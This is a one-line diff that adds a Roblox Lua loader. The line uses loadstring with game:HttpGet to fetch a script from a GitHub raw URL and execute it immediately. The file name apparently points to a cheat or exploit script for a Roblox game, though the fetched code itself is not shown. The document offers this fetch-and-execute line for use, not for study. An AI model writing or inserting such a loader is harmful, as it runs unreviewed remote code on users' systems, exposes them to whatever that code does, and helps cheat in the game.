@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/anime-dice-spam0-bdw1lkbih0g1eh.lua"))()
